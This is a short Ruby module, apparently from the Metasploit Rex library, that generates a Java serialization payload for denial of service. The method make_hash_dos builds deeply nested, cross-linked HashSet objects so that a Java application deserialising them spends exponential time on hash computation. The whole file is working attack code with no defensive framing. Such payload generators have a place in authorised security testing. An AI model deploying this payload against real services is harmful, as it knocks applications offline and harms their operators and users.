# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class DOS
          def self.make_hash_dos(nestingLevel)
            root = Model::JavaObject.new('Ljava/util/HashSet;', 'elements' => [])
            a = root
            b = Model::JavaObject.new('Ljava/util/HashSet;', 'elements' => [])
            for i in 1...nestingLevel
              t1 = Model::JavaObject.new('Ljava/util/HashSet;', 'elements' => ['foo'])
              t2 = Model::JavaObject.new('Ljava/util/HashSet;', 'elements' => [])

              a.fields['elements'].push(t1)
              a.fields['elements'].push(t2)

              b.fields['elements'].push(t1)
              b.fields['elements'].push(t2)

              a = t1
              b = t2
            end
            root
          end
        end
      end
    end
  end
end
